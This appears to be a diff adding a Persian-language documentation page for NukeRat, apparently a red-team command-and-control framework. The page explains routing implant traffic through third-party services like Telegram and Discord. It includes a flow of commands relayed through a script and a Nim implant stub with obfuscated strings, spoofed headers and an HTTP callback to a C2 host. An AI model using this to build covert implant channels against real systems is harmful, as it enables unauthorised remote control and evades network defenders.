@@ -1,0 +1,145 @@
+---
+title: کانال‌های سفارشی
+---
+
+import { Callout } from '@/ui/custom/callout';
+import customChannelMap from '@/assets/img/tutorial/map.png';
+import { ImageZoom } from 'fumadocs-ui/components/image-zoom';
+import { Step, Steps } from 'fumadocs-ui/components/steps';
+
+اگر کانال ارتباطی از طریق سرویس‌های خارجی مثل Telegram، Discord و مشابه می‌خواهید، این صفحه برای شماست.
+
+<Callout
+  type="warning"
+  title="پلتفرم‌های third-party"
+  className="rounded-[6px] border-red-500/70 bg-red-950/50 shadow-red-950/20 [&_svg]:text-red-400 [&_.text-fd-muted-foreground]:text-red-100/95 [&_p.font-medium]:text-red-200"
+>
+  پروژه NukeRat بر استفاده از پلتفرم‌های third-party به‌عنوان command and control، بدون مجوز صریح اپراتور و رعایت کامل قوانین مربوطه، تأثیر نمی‌گذارد، آن را توصیه نمی‌کند و ترویج نمی‌دهد. نام‌های بالا فقط مثال‌های توضیحی هستند، نه تأیید یا راهنمایی از سوی پروژه.
+</Callout>
+
+## نحوه کار
+
+برای ساخت کانال سفارشی، کمک می‌کند به‌اختصار بگوییم قطعات چطور کنار هم می‌آیند. اساساً سه ستون دارد:
+
+1. listener HTTP
+2. ایمپلنت با کانال سفارشی
+3. اسکریپت سفارشی
+
+با هم ارتباط بین ایمپلنت و team server را منتقل می‌کنند، بدون اینکه ایمپلنت به‌جز سرویس third-party مجاز انتخابی شما درخواستی بزند.
+
+جریان باید شبیه نمودار زیر باشد:
+
+<ImageZoom src={customChannelMap} alt="Custom channel flow" className="tutorial_img" />
+
+### ( ۲ ) Listener
+
+به listener HTTP پیکربندی‌شده نیاز دارید. می‌توانید از API سرور تیم هم استفاده کنید؛ در مثال‌ها listener HTTP را می‌گیریم.
+
+### ( ۳ ) اسکریپت سفارشی
+
+یکی از مهم‌ترین مراحل است. اسکریپتی می‌نویسید که با سرویس third-party و listener صحبت کند و نوعی «ترجمه» انجام دهد.
+
+### ( ۴ ) پلتفرم third-party
+
+پلتفرمی که به‌عنوان کانال خارجی انتخاب کرده‌اید.
+
+### ( ۵ ) ایمپلنت
+
+ایمپلنتی که از زمان compile منطق ارتباط سفارشی دارد.
+
+## جریان ارتباط
+
+حالا که ساختار را می‌شناسید، راحت‌تر می‌توان سناریویی با پلتفرم پیام‌رسانی خارجی — مثل چتی شبیه Telegram — را مرور کرد.
+
+  <Steps>
+    <Step>
+      دستور `whoami` به صف فرستاده می‌شود.
+    </Step>
+    <Step>
+      اسکریپت سفارشی حلقه‌ای دارد که هر ۵ ثانیه با listener برای گرفتن دستورات صحبت می‌کند. وقتی یکی پیدا کند، به سرویس خارجی درخواست می‌فرستد، مثلاً:
+
+      ```
+      input | 938192 | whoami
+      ```
+    </Step>
+    <Step>
+      روی سرویس خارجی پیامی با همان محتوا ظاهر می‌شود.
+    </Step>
+    <Step>
+      ایمپلنت درخواست‌های خودش را به آن سرویس با کلیدها و tokenهای لازم دارد. در هر درخواست بررسی می‌کند دستوری منتظرش هست یا نه؛ اگر باشد اجرا می‌کند.
+
+      سپس نتیجه را به سرویس خارجی می‌فرستد، مثلاً:
+
+      ```
+      output | 938192 | whoami | root
+      ```
+    </Step>
+    <Step>
+      در یکی از حلقه‌ها اسکریپت خروجی را می‌بیند و طبق [API ایمپلنت](/docs/rest-api/implants) به listener درخواست می‌فرستد گویی خود ایمپلنت است. بعد آن محتوا را از سرویس خارجی حذف می‌کند.
+    </Step>
+    <Step>
+      listener درخواست را می‌گیرد، مثل ترافیک ایمپلنت می‌بیند و دستور را کامل می‌کند.
+    </Step>
+  </Steps>
+
+## اسکریپت سفارشی
+
+اینجا راز خاصی نیست. شما مسئول اسکریپتی هستید که در حلقه بزند، سرویس خارجی انتخابی را رصد کند و ترافیک را به listener هدایت کند. بسته به هدف ممکن است پیچیدگی بیشتری ببینید، مخصوصاً در تقسیم خروجی یا ورودی خیلی بزرگ.
+
+## کانال سفارشی
+
+همان‌طور که گفته شد، ایمپلنت باید با منطق ارتباط برای سرویسی که انتخاب کرده‌اید ساخته شود؛ یعنی چیزی سفارشی بنویسید و گاهی از صفر شروع کنید.
+
+در ساخت ایمپلنت **Command and control** را باز کنید و زیر CHANNEL گزینه **Custom channel** را انتخاب کنید.
+
+بلافاصله بعد از آن textarea با stub کدی شبیه زیر ظاهر می‌شود:
+
+```nim
+
+# imports...
+
+var customServerHost = obf("http://192.168.15.10:9090/")
+const delaySeconds = 2
+customCookies = toTable([
+  (obf("session"), obf("example")),
+  (obf("token"), obf("example")),
+])
+customHeaders = toTable([
+  (obf("User-Agent"), obf("Mozilla/5.0")),
+  (obf("X-Custom-Header"), obf("example")),
+])
+
+proc httpPost(
+    url, payload: string;
+    cookies: Table[string, string];
+    headers: Table[string, string]
+): tuple[code: uint16, body: string] =
+  var pairs: seq[(string, string)] = @[(obf("Connection"), obf("close"))]
+  for key, value in headers:
+    pairs.add((key, value))
+  var cookieParts: seq[string] = @[]
+  for key, value in cookies:
+    cookieParts.add(key & obf("=") & value)
+  if cookieParts.len > 0:
+    pairs.add((obf("Cookie"), cookieParts.join(obf("; "))))
+  let r = nhttp.winHttpPerform(url, "POST", payload, pairs)
+  (code: r.code, body: r.body)
+
+# Rest of the code...
+```
+
+این چیزی بیش از ارتباط HTTP پیش‌فرض به‌صورت procedural نیست تا بتوانید راحت‌تر سفارشی‌اش کنید. می‌توانید این منطق را مطابق نیازتان عوض کنید.
+
+در موارد پیچیده‌تر ممکن است helperهای اضافه برای fragmentation، رمزنگاری و غیره بگذارید.
+
+## Relay و pivoting
+
+تنظیم این بخش آزاردهنده است اما لازم. کنار تب **Implant routine** تب **Relay forwarder** را می‌بینید؛ منطق relay خروجی.
+
+وقتی relay پیکربندی می‌کنید، همیشه یک relay آخر ترافیک را به team server می‌فرستد و آن ترافیک باید به درخواست HTTP و JSON شکل بگیرد. این بلوک کد مسئول همان است. پس اگر relay را همراه کانال سفارشی می‌خواهید، این را هم باید تنظیم کنید.
+
+برای آرامش خاطر، اغلب می‌توانید همان منطق **Implant routine** را در **Relay forwarder** تطبیق دهید.
+
+## تست پشت تست
+
+بله، ساخت کانال سفارشی می‌تواند خسته‌کننده و پیچیده باشد؛ پس توصیه می‌کنیم قبل از اتکا در production کل منطق را تست کنید. در هر build ایمپلنت اگر منطق اشتباه باشد exception می‌گیرید که توسعه را خیلی آسان‌تر می‌کند.
